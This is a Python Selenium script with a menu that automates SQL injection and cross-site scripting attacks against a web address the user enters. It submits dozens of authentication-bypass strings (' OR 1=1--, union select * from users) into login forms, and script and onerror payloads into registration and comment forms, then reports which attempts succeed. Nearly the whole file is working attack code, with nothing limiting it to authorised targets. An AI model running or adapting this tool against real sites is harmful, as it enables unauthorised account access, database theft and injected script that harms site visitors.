from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def open_browser_and_submit_form(url, data, form_type):
    firefox_path = r'C:\Program Files\Mozilla Firefox\firefox.exe'
    firefox_options = webdriver.FirefoxOptions()
    firefox_options.binary_location = firefox_path
    driver = webdriver.Firefox(options=firefox_options)
    driver.get(url)

    try:
        if form_type == 'login':
            username_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, 'username'))
            )
            password_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, 'password'))
            )
            username_field.send_keys(data['username'])
            password_field.send_keys(data['password'])
            password_field.submit()
            
            success_message = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CLASS_NAME, 'dashboard'))
            )
            print("Login successful with payload:", data['username'])

        elif form_type == 'register':
            username_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, 'username'))
            )
            email_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, 'email'))
            )
            password_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, 'password'))
            )
            username_field.send_keys(data['username'])
            email_field.send_keys(data['email'])
            password_field.send_keys(data['password'])
            password_field.submit()
            
            success_message = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CLASS_NAME, 'dashboard'))
            )
            print("Successful registration with payload:", data['username'])

        elif form_type == 'comment':
            comment_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, 'comment'))
            )
            comment_field.send_keys(data['comment'])
            comment_field.submit()
            
            success_message = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CLASS_NAME, 'dashboard'))
            )
            print("Comment successfully with payload:", data['comment'])

    except Exception as e:
        print(f"Failed to insert payload into form {form_type}: {e}")

    driver.quit()

def generate_sqli_payloads():
    payloads = [
        "' OR 1=1--",
        "' OR 1=1-- -",
        "' OR 1=1#",
        "' OR '1'='1'--",
        "' OR '1'='1'-- -",
        "' OR '1'='1'#",
        "' OR '1'='1--",
        "' OR '1'='1-- -",
        "' OR '1'='1'#",
        "\" OR 1=1--",
        "\" OR 1=1-- -",
        "\" OR 1=1#",
        "') OR 1=1--",
        "') OR 1=1-- -",
        "') OR 1=1#",
        "'; OR 1=1--",
        "'; OR 1=1-- -",
        "'; OR 1=1#",
        "admin or 1=1--",
        "admin or 1=1-- -",
        "admin or 1=1#",
        "' OR 'x'='x",
        "\" OR \"x\"=\"x",
        "') OR ('x'='x",
        "\")) OR (('x\"=\"x",
        "')) OR ((\"x\"=\"x",
        "' or 1=1--",
        "\" or 1=1--",
        "') or 1=1--",
        "\") or 1=1--",
        "' or '1'='1",
        "\" or \"1\"=\"1",
        "') or ('1'='1",
        "\") or (\"1\"=\"1",
        "' or a=a--",
        "\" or a=a--",
        "') or a=a--",
        "\") or a=a--",
        "' or username like '%",
        "\" or username like '%",
        "') or username like '%",
        "\") or username like '%",
        "' or 'x'='x",
        "\" or \"x\"=\"x",
        "') or ('x'='x",
        "\") or (\"x\"=\"x",
        "' or 1=1--",
        "\" or 1=1--",
        "') or 1=1--",
        "\") or 1=1--",
        "' or a=a--",
        "\" or a=a--",
        "') or a=a--",
        "\") or a=a--","' OR 'x'='x",
        "\" OR \"x\"=\"x",
        "') OR ('x'='x",
        "\")) OR (('x\"=\"x",
        "')) OR ((\"x\"=\"x",
        "' or 1=1--",
        "\" or 1=1--",
        "') or 1=1--",
        "\") or 1=1--",
        "' or a=a--",
        "\" or a=a--",
        "') or a=a--",
        "\") or a=a--",
        "' or username like '%",
        "\" or username like '%",
        "') or username like '%",
        "\") or username like '%",
        "' or 'x'='x",
        "\" or \"x\"=\"x",
        "') or ('x'='x",
        "\") or (\"x\"=\"x",
        "' or 1=1--",
        "\" or 1=1--",
        "') or 1=1--",
        "\") or 1=1--",
        "' or a=a--",
        "\" or a=a--",
        "') or a=a--",
        "\") or a=a--",
        "' union select null--",
        "\" union select null--",
        "') union select null--",
        "\") union select null--",
        "' union select * from users--",
        "\" union select * from users--",
        "') union select * from users--",
        "\") union select * from users--",
        "' or 1=1--",
        "\" or 1=1--",
        "') or 1=1--",
        "\") or 1=1--",
        "' or a=a--",
        "\" or a=a--",
        "') or a=a--",
        "\") or a=a--",
        "' union select null--",
        "\" union select null--",
        "') union select null--",
        "\") union select null--",
        "' union select * from users--",
        "\" union select * from users--",
        "') union select * from users--",
        "\") union select * from users--"
    ]
    return payloads

def generate_xss_payloads():
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src='https://www.shutterstock.com/image-vector/attention-danger-symbol-on-dark-260nw-2204728543.jpg' onerror=alert('XSS')>",
        "\"><script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "\"><img src='https://www.shutterstock.com/image-vector/attention-danger-symbol-on-dark-260nw-2204728543.jpg' onerror=alert('XSS')>",
        "'><img src='https://www.shutterstock.com/image-vector/attention-danger-symbol-on-dark-260nw-2204728543.jpg' onerror=alert('XSS')>"
    ]
    return payloads

def execute_payloads(target_url, payloads, payload_type="sqli", form_type="login"):
    for payload in payloads:
        if form_type == 'login':
            data = {
                'username': payload,
                'password': 'password'
            }
        elif form_type == 'register':
            data = {
                'username': payload,
                'email': 'test@example.com',
                'password': 'password',
                'name': 'test'
            }
        elif form_type == 'comment':
            data = {
                'comment': payload,
                'email': 'test@example.com',
                'author': 'test',
                'url': 'https://google.com'
            }
        
        print(f"Executing {payload_type.upper()} Payload on {form_type} form: {payload}")
        open_browser_and_submit_form(target_url, data, form_type)

def main():
    while True:
        print("Select the payload type:")
        print("1. SQL Injection")
        print("2. Cross-Site Scripting (XSS)")
        print("3. Exit")
        
        choice = input("Enter options (1/2/3): ")

        if choice == '1':
            target_login_url = input("[SQL Injection] Enter the target login URL: ")
            sqli_payloads = generate_sqli_payloads()
            print("Executing SQL Injection Payloads...")
            execute_payloads(target_login_url, sqli_payloads, payload_type="sqli", form_type="login")
        elif choice == '2':
            print("Select the form for XSS injection:")
            print("1. Form Registration")
            print("2. Form Comment")
            xss_choice = input("Enter options (1/2): ")

            if xss_choice == '1':
                target_register_url = input("[Registration] Enter the target login URL: ")
                xss_payloads = generate_xss_payloads()
                print("Executing XSS Payloads on Registration Form...")
                execute_payloads(target_register_url, xss_payloads, payload_type="xss", form_type="register")
            elif xss_choice == '2':
                target_comment_url = input("[Comment] Enter the target login URL: ")
                xss_payloads = generate_xss_payloads()
                print("Executing XSS Payloads on Comment Form...")
                execute_payloads(target_comment_url, xss_payloads, payload_type="xss", form_type="comment")
            else:
                print("Invalid selection. Please choose between 1 or 2.")
        elif choice == '3':
            print("Exit Program.")
            break
        else:
            print("Invalid selection. Please choose between 1, 2, or 3.")

if __name__ == "__main__":
    main()